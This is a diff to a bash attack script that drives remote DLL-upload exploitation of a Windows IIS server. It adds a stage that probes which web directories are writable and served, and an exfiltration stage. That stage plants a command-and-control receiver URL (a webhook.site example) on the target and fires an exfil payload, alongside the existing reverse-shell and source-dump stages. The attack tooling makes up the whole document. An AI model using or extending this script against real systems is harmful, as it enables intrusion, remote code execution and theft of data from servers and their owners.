@@ -40,9 +40,9 @@ banner() { # $1 = text
 # ---------------------------------------------------------------- args
 ARG="${1:-auto}"
 case "$ARG" in
-  auto|check|versions|exploit|shell|all|dumpsrc) STAGE="$ARG" ;;
+  auto|check|versions|exploit|shell|all|dumpsrc|writemap|exfil) STAGE="$ARG" ;;
   http://*|https://*) TARGET_URL="$ARG"; STAGE="${STAGE:-all}" ;;
-  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|all|http(s)://HOST:PORT]" ;;
+  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|writemap|exfil|all|http(s)://HOST:PORT]" ;;
 esac
 
 BASE_URL=""
@@ -83,10 +83,13 @@ pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll for $ARC
 SLEEP_DLL="$(pick_payload sleep)"
 REV_DLL="$(pick_payload revshell)"
 DUMP_DLL="$(pick_payload dump-src)"
+EXFIL_DLL="$(pick_payload exfil)"
+C2_URL="${C2_URL:-}"
 [ -n "$SLEEP_DLL" ] || die "No sleep payload in $PAYLOAD_DIR (run on Windows / let CI build, or ARCH=x86)"
 info "sleep payload:   $SLEEP_DLL"
 [ -n "$REV_DLL" ] && info "revshell payload: $REV_DLL"
 [ -n "$DUMP_DLL" ] && info "dump-src payload: $DUMP_DLL"
+[ -n "$EXFIL_DLL" ] && info "exfil payload:    $EXFIL_DLL"
 
 # ---------------------------------------------------------------- target discovery
 host_ip() { # $1 interface name
@@ -310,6 +313,80 @@ stage_dumpsrc() {
   info "  DONE (see the timestamps or check src.zip manually)"
 }
 
+stage_writemap() {
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  banner "WRITE-MAP"
+  info "Probing candidate directories with a tiny marker upload."
+  info "GOOD = writable. Then curl the URL to see if it is also served."
+  info ""
+  local marker="$ROOT/.writemap.txt"
+  printf 'writemap %s\n' "$(date -u +%Y%m%dT%H%M%SZ)" > "$marker"
+
+  local dirs=(
+    'C:\inetpub\wwwroot\StartUp'
+    'C:\inetpub\wwwroot\StartUp\App_Data'
+    'C:\inetpub\wwwroot\App_Data'
+    'C:\inetpub\wwwroot\uploads'
+    'C:\inetpub\wwwroot\Upload'
+    'C:\inetpub\wwwroot\files'
+    'C:\inetpub\wwwroot\images'
+    'C:\inetpub\wwwroot\bin'
+    'C:\inetpub\wwwroot\StartUp\Temp'
+    'C:\inetpub\vhosts\default\htdocs'
+    'C:\inetpub\ftproot'
+    'C:\Windows\Temp'
+  )
+  local d remote
+  for d in "${dirs[@]}"; do
+    remote=$(upload_payload "$marker" "$VERSION" "$d" 2>/dev/null)
+    if [ -n "$remote" ]; then
+      printf '  %bGOOD%b   %s  ->  %s\n' "$G" "$N" "$d" "$remote"
+    else
+      printf '  %bno%b     %s\n' "$Y" "$N" "$d"
+    fi
+  done
+  rm -f "$marker"
+  info ""
+  info "For every GOOD entry, test whether it is served:"
+  info "  curl -s -o /dev/null -w '%{http_code}\\n' http://<host>:82/<rel>/<name>"
+  info "A 200 means writable AND served - drop src.zip there."
+}
+
+stage_exfil() {
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  [ -n "$EXFIL_DLL" ] || die "No exfil payload in $PAYLOAD_DIR."
+  [ -n "$C2_URL" ] || die "Set C2_URL to a receiver, e.g. C2_URL=https://webhook.site/<uuid>"
+  banner "EXFIL"
+  info "Receiver: $C2_URL"
+  info ""
+
+  local cfg="$ROOT/.c2.txt"
+  printf '%s\n' "$C2_URL" > "$cfg"
+  log "uploading receiver config -> C:\\Windows\\Temp\\c2.txt"
+  local rc
+  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 2>/dev/null)
+  rm -f "$cfg"
+  if [ -z "$rc" ]; then
+    warn "could not upload c2.txt; the payload will skip the network step"
+  else
+    info "config uploaded as $rc"
+  fi
+
+  local a arches dll
+  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
+  for a in "${arches[@]}"; do
+    dll=$(ARCH="$a" pick_payload exfil)
+    [ -n "$dll" ] || { warn "no $a exfil payload"; continue; }
+    log "FIRE: $(basename "$dll") (arch $a)"
+    fire_payload "$dll" 'C:\Windows\Temp' >/dev/null 2>&1
+    break
+  done
+  info ""
+  info "Give it ~60s, then reassemble:"
+  info "  ./pull-exfil.sh <token-uuid>"
+  banner "EXFIL FIRED"
+}
+
 stage_shell() {
   [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
   [ -n "$REV_DLL" ] || die "No revshell payload in $PAYLOAD_DIR."
@@ -357,4 +434,6 @@ case "$STAGE" in
   exploit|all) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exploit ;;
   shell)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_shell ;;
   dumpsrc)  stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_dumpsrc ;;
+  writemap) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_writemap ;;
+  exfil)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exfil ;;
 esac
